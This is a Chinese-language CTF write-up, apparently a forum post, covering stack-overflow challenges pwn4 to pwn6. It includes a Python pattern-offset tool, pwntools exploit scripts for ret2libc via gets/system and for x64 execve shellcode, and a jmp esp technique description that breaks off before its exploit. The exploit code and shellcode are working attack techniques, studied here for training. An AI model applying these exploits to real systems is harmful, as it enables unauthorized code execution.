
```python
#!/usr/bin/env python
#####################################################################################
## Create pattern strings & location offset
## Tested against Ubuntu 12.04 & Windows # #
##
## Example:
## C:\Users\Lenov\Desktop> patterLocOffset.py -c -l 260 -f output.txt
### [\*] Create pattern string contains 260 characters ok!
### [+] output to output.txt ok!
##
## C:\Users\Lenov\Desktop> patternLocOffset.py -s 0x41613141 -l 260
### [\*] Create pattern string contains 260 characters ok!
### [\*] Exact match at offset 3
#
## Nimdakey # 09-10-2013
#####################################################################################
import argparse
import struct
import binascii
import string
import time
import sys
import re
a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
b = "abcdefghijklmnopqrstuvwxyz"
c = "0123456789"
def generate(count,output):
#
# pattern create
codeStr = ''
print '[\*] Create pattern string contains %d characters'%count,
timeStart = time.time()
for i in range(0,count):
codeStr += a[i/(26\*10)]+b[(i%(26\*10))/10]+c[i%(26\*10)%10]
print 'ok!'
if output:
print '[+] output to %s'%output,
fw = open(output,'w')
fw.write(codeStr)
fw.close()
print 'ok!'
else:
return codeStr
print "[+] take time: %.4f s"%(time.time()-timeStart)
def patternMatch(searchCode, length=1024):
#
# pattern search
offset = 0
pattern = None
timeStart = time.time()
is0xHex = re.match('^0x[0-9a-fA-F]{8}',searchCode)
isHex = re.match('^[0-9a-fA-F]{8}',searchCode)
if is0xHex:
#0x41613141
pattern = binascii.a2b\_hex(searchCode[2:])
elif isHex:
#41613141
pattern = binascii.a2b\_hex(searchCode)
else:
print '[-] seach Pattern eg:0x41613141'
sys.exit(1)
source = generate(length,None)
offset = source.find(pattern)
if offset != -1:
print "[\*] Exact match at offset %d"%offset
else:
print "[\*] No exact matches, looking for likely candidates..."
reverse = list(pattern)
reverse.reverse()
pattern = "".join(reverse)
offset = source.find(pattern)
if offset != -1:
print "[+] Possible match at offset %d (adjusted another-endian)"%offset
print "[+] take time: %.4f s"%(time.time()-timeStart)
def main():
## parse argument
parser = argparse.ArgumentParser()
parser.add\_argument('-s', '--search', help='search for pattern')
parser.add\_argument('-c', '--create', help='create a pattern',\
action='store\_true')
parser.add\_argument('-f', '--file', help='output file name',\
default='patternShell.txt')
parser.add\_argument('-l', '--length',help='length of pattern code',\
type=int,default=1024)
#parser.add\_argument('-v', dest='verbose', action='store\_true')
args = parser.parse\_args()
## save all argument
length = args.length
output = args.file
#verbose = args.verbose
createCode = args.create
searchCode = args.search
if createCode and (0 < args.length <= 26\*26\*10):
#eg: -c -l 90
generate(length,output)
elif searchCode and (0 < args.length <= 26\*26\*10):
#eg: -s 0x474230141
patternMatch(searchCode,length)
else:
print '[-] You shoud chices from [-c -s]'
print '[-] Pattern length must be less than 6760'
print 'more help: pattern.py -h'
# ...
if \_\_name\_\_ == "\_\_main\_\_":
main()
```

发现实际的偏移是108个字节，覆盖点距离`ebp`，那么距离返回地址就应该是108+4=112字节

之前没找到字符串，因此这里我们需要想个办法，直观的想法是在`shellcode`中，在参数的位置直接放入字符串`"/bin/sh"`

```
payload = flat(['a' \* 112, system\_plt, 0xabcdabcd, “/bin/sh”])
```

但是放在堆栈中的是程序执行的指令，而不是实际的字符串，因此，按照上述方式放置字符串，`system`并不会读取`"/bin/sh"`，而是读取`"/bin/sh"`对应的4个字节的地址所指向的内存空间

![](upload/attach/201904/823237\_DMDF88FPSQSA2RK.png)

之后发现程序中还载入了函数`gets`，可以利用`gets`来读取用户输入的`"/bin/sh"`放置到某个地址空间去，接着`system`再调用它，“某个地址空间”可以是下面的`buf2`，可以发现它的地址是`0x0804A080`，这个空间可以让我们使用

![](upload/attach/201904/823237\_7GBKVKCV4RFX76S.png)

exp如下：

```python
##!/usr/bin/env python
from pwn import \*
sh = process('./pwn4')
shelf = ELF('./pwn4')
gets\_plt = shelf.plt['gets']
system\_plt = shelf.plt['system']
pop\_ebp = 0x0804872f
buf2 = 0x804a080
payload = flat(
['a' \* 112, gets\_plt, pop\_ebp, buf2, system\_plt, 0xabcdabcd, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

`Pop_ebp`的主要目的是让`eip`流向`system`的位置，并且取出`system`地址赋值给`eip`，`Pop_ebp`其实不一定是`pop ebp`，`pop`任何其他的寄存器都可以，主要是利用该指令的`esp+4`的功能

这里还要返回`ret`一下，这样才会实际的提取`system`的地址出来，赋值给`eip`

![](upload/attach/201904/823237\_PFFV2ZE6F5AFM8F.png)

![](upload/attach/201904/823237\_84VMZPPE5QTA4G3.png)

拿到shell

![](upload/attach/201904/823237\_GZ3G7MVSXT4JXNQ.png)

### Pwn5

基础三联，发现是64位程序，开启了地址随机化

![](upload/attach/201904/823237\_8FNAEKNV5PFYTXA.png)

漏洞函数

![](upload/attach/201904/823237\_CCWQJ93YJ6DT9BP.png)

计算输入值在堆栈中距离`ebp`的偏移

![](upload/attach/201904/823237\_W6D3DGPDRRKH7B2.png)

![](upload/attach/201904/823237\_MZUVTXZ6DAKMYH2.png)

距离`EBP`的偏移是16个字节，距离存放的返回地址是16+8=24个字节，IDA分析也是`0x10`个字节。

![](upload/attach/201904/823237\_YXSPKP4CVAFE7CH.png)

导入表没有可利用的函数

![](upload/attach/201904/823237\_YBGS5YCVY2QV53T.png)

但是由于堆栈可以执行，因此我们可以考虑直接将`shellcode`放在`payload`里面，因此，这里和下面分析是否有字符串`/bin/sh`合并了，我们可以自己放置字符串，并且调用对应的地址了

理论上，可以直接利用`pwntools`产生的`shellcode`来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署`shellcode`的长度还剩下32个字节，使用`pwntools`产生的`shellcode`有44个字节，太长了。因此，我们可以从网上找到更短的`shellcode`：

```
# 23 bytes
# https://www.exploit-db.com/exploits/36858/
shellcode\_x64 = "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"
```

它的汇编形式是

```
# char \*const argv[]
xorl %esi, %esi
# 'h' 's' '/' '/' 'n' 'i' 'b' '/'
movq $0x68732f2f6e69622f, %rbx
# for 'x00'
pushq %rsi
pushq %rbx
pushq %rsp
# const char \*filename
popq %rdi
# \_\_NR\_execve 59
pushq $59
popq %rax
# char \*const envp[]
xorl %edx, %edx
syscall
```

现在的目标就是找到`shellcode`的地址，其实就是`buf`的地址加上32个字节的偏移，前面发现，该程序是动态改变地址的，因此静态的确认`buf`地址是不可行的，所以静态的确认`shellcode`的地址是不可行的。

发现程序中有`printf`函数，理论上可以利用它来打印`buf`的地址，然后实时的计算`buf+32`的地址，就能够得到`shellcode`的地址，它实际上已经为我们解决了这个问题，自己输出了`buf`的地址

![](upload/attach/201904/823237\_XE3A3E88HUWVCQV.png)

exp思路就是： 实时读取`buf`的地址，计算`buf+32`得到`shellcode`的地址，放置在`payload`中

```python
from pwn import \*
sh = process('./pwn5')
sh = ELF('./pwn5')
# 23 bytes
# https://www.exploit-db.com/exploits/36858/
shellcode\_x64 = "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"
sh.recvuntil('[')
buf\_addr = sh.recvuntil(']', drop=True)
buf\_addr = int(buf\_addr, 16)
payload = 'b' \* 24 + p64(buf\_addr + 32) + shellcode\_x64
sh.sendline(payload)
sh.interactive()
```

![](upload/attach/201904/823237\_JTWQJ29XMT2YHNF.png)

`shellcode`的内容就是打开一个`shell`

![](upload/attach/201904/823237\_P8CGWCUVE9RWVFG.png)

### Pwn6

基础三联

![](upload/attach/201904/823237\_EGE3CDTFZM3NRPP.png)

漏洞函数是`fgets`函数，仅仅读取50个字节的字符长度

![](upload/attach/201904/823237\_KNRWP4E6BEH9JNP.png)

计算目标变量的在堆栈中距离`ebp`的偏移，方法和前面类似，发现偏移距离`ebp`是`0x20`，那么距离`ret_addr`就是`0x20+4=0x24`（36）字节

![](upload/attach/201904/823237\_KMS7AV8VJS75MMU.png)

是否导入可以用函数，no one

![](upload/attach/201904/823237\_MPC4Y3AAPADFTU4.png)

字符串也找不到

![](upload/attach/201904/823237\_RC3ZGB8KGMK4YZY.png)

考虑利用`shellcode`，好像可以类似于上一题的操作了。但是并不能，留给我们布置`shellcode`的长度为50-36-4=10字节（同样有4个字节的返回地址存放）

这里可以考虑把`shellcode`放在栈里

![](upload/attach/201904/823237\_965B7BQZPWX7XHV.png)

这样就总共有`0x20`（36个字节）的位置存放`shellcode`的了。但是，要做到跳转到放置`shellcode`的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：

1. 推算`shellcode`放置的地址

2. 跳转到`shellcode`放置的位置

首先，第一点，`shellcode`的位置就是发射`payload`的时候`esp_old`的位置，我们可以推算出来，当程序提取完返回地址之后，`esp`指向的地址距离`esp_old`的地址为`0x20+4(ebp)+4(ret_addr)=0x28`。因此，我们需要用当前的`esp-0x28`，得到的就是`shellcode`的地址。

对于第二点，我们如何让`eip`顺利的依次取出我们设计好的路线图呢？在`ret_addr`，我们需要寻找到一个`gadget`，它能够跳转到`esp`的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在`ret_addr`的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要`jmp esp`这个操作，来让程序流获得在栈上执行的权限。

![](upload/attach/201904/823237\_XSG6XZZED6JE224.png)

发现只有这么一个地址：`0x08048504`。注意，当我们取出`ret_addr`里面的地址的时候，`esp`已经+4了，因此就会指向我们的下一步操作：跳转回`esp_old`的位置。

直接可以选择让`pwntools`产生可执行的代码`sub esp 0x28; jmp esp`，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。

exp：
